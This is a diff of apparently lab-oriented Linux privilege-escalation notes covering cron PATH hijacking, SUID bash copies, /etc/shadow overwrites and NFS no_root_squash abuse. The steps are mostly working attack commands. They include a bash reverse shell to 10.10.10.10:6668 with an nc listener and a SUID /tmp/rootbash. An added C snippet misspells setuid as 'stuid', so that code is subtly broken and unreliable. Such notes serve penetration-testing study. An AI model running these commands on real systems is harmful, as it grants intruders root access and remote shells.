@@ -28,10 +28,15 @@
 > _command_ `cat /etc/crontab`  
 > `locate overwrite.sh` or `locate backup.sh`  
 > A similar situation where the "any.sh" script was deleted, but the cron job still exists.
-> If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the _/etc/crontab_ file. In this case, we should be able to create a script named “any.sh” under our user’s home folder and it should be run by the cron job.
-> _modify or create script_  
-> `#!/bin/bash`  
-> `bash -i >& /dev/tcp/10.10.10.10/6668 0>&1`  
+> If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the _/etc/crontab_ file. In this case, we should be able to create a script named “any.sh” under our user’s home folder and it should be run by the cron job.  
+> _modify or create script_
+
+```sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.10.10/6668 0>&1
+```
+
 > We will now run a listener on our attacking machine to receive the incoming connection:  
 > _command_ `nc -nlvp 6668`
 
@@ -39,11 +44,16 @@
 > _command_ `cat /etc/crontab`  
 > Note that the PATH variable starts with /home/user which is our user's home directory.  
 > Create a file called overwrite.sh in your home directory with the following contents:  
-> _modify script_  
-> `#!/bin/bash`  
-> `cp /bin/bash /tmp/rootbash`  
-> `chmod +xs /tmp/rootbash`  
->  Make sure that the file is executable:  
+> _modify script_
+
+```sh
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+> Make sure that the file is executable:  
 > `chmod +x /home/user/overwrite.sh`  
 > Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges: `/tmp/rootbash -p`
 
@@ -60,3 +70,26 @@
 > `mkpasswd -m sha-512 newpasswordhere`  
 > Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.  
 > Switch to the root user, using the new password.
+
+> **NFS (Network File Sharing)**  
+>  configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.  
+>  _command_ `cat /etc/exports`  
+>  The critical element for this privilege escalation vector is the “no_root_squash”. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
+>  We will start by enumerating mountable shares from our attacking machine: `showmount -e 10.10.10.10`  
+>  We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable: `mkdir /tmp/backupsonattackermachine`  
+>  `mount -o rw 10.10.10.10:/fileexport /tmp/backupsonattackermachine`  
+>  As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job: `nano nfs.c`
+
+```c
+int main()
+{ setgid(0);
+  stuid(0);
+  system("/bin/bash");
+  return 0;
+}
+```
+
+> Once we compile the code we will set the SUID bit: `gcc nfs.c -o nfs -w`  
+>  `chmod +s nfs`  
+>  `ls -l nfs`  
+>  `./nfs`
